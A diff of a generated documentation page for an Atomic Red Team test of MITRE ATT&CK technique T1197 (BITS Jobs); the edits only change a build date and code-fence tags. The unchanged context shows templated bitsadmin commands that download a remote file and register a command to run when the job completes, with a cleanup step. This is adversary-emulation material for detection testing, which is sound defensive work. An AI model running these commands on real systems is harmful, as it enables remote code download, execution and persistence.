@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1197"
 attack_technique_name: "BITS Jobs"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "62a06ec5-5754-47d2-bcfc-123d8314c6ae"
@@ -71,7 +71,7 @@ This job will remain in the BITS queue until complete or for up to 90 days by de
 
 ### Command
 
-```commandprompt
+```cmd
 bitsadmin.exe /create #{bits_job_name}
 bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
 bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
@@ -82,7 +82,7 @@ bitsadmin.exe /complete #{bits_job_name}
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{local_file} >nul 2>&1
 ```
 
